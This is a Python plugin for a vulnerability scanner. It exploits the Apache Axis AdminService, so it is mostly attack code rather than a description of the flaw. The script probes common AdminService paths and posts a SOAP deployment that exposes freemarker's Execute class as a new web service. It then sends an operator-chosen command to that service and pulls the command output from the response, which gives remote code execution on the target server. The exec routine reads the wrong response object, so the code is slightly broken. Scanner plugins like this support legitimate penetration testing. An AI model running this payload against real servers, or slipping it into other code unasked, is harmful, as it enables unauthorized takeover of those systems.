#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import re
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for url in self.get_url_normpath_list(self.url, [
                    './AdminService?wsdl',
                    './services/AdminService?wsdl',
                    './axis/services/AdminService?wsdl',
                    './axis2/services/AdminService?wsdl'
                ]):
                    headers = {'Content-Type': 'text/xml; charset=utf-8','SOAPAction': '""'}
                    data = '''<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soapenv:Body>
<deployment xmlns="http://xml.apache.org/axis/wsdd/"
xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
<service name="freemarker" provider="java:RPC">
<parameter name="className" value="freemarker.template.utility.Execute"/>
<parameter name="allowedMethods" value="*"/>
</service>
</deployment>
</soapenv:Body></soapenv:Envelope>
    '''
                    async with session.post(url=url, data=data,headers=headers) as res:
                        if res!=None and res.status:
                            text = await res.text()
                            if 'Done processing' in text:
                                yield url
                                break

    async def exec(self):
        if self.base_url:
            async with ClientSession() as session:
                command = self.parameter['cmd']
                for url in self.get_url_normpath_list(self.url, [
                    './AdminService?wsdl',
                    './services/AdminService?wsdl',
                    './axis/services/AdminService?wsdl',
                    './axis2/services/AdminService?wsdl'
                ]):
                    headers = {'Content-Type': 'text/xml; charset=utf-8','SOAPAction': '""'}
                    data = '''<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soapenv:Body>
<deployment xmlns="http://xml.apache.org/axis/wsdd/"
xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
<service name="freemarker" provider="java:RPC">
<parameter name="className" value="freemarker.template.utility.Execute"/>
<parameter name="allowedMethods" value="*"/>
</service>
</deployment>
</soapenv:Body></soapenv:Envelope>
'''

                    async with session.post(url=url, data=data, headers=headers) as res:
                        if res!=None and res.status == 200:
                            text = await res.text()
                            if 'Done processing' in text:
                                url1 = url.replace('/services/AdminService?wsdl','/services/freemarker?wsdl')
                                data1 = '''<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><arg0 href="#id0"/></exec><multiRef id="id0" soapenc:root="0" soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" soapenc:arrayType="xsd:anyType[1]" xsi:type="soapenc:Array" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"><multiRef xsi:type="soapenc:string">''' +command + '''</multiRef></multiRef></soapenv:Body></soapenv:Envelope>'''
                                async with session.post(url=url1, data=data1, headers=headers) as res1:
                                    if res1 != None and res1.status == 200 :
                                        text1 = await res.text()
                                        m = re.search('<execReturn.*>(.*)[\s]+<\/execReturn>', text1)
                                        if m != None and m.group(1):
                                            yield url
                                            break
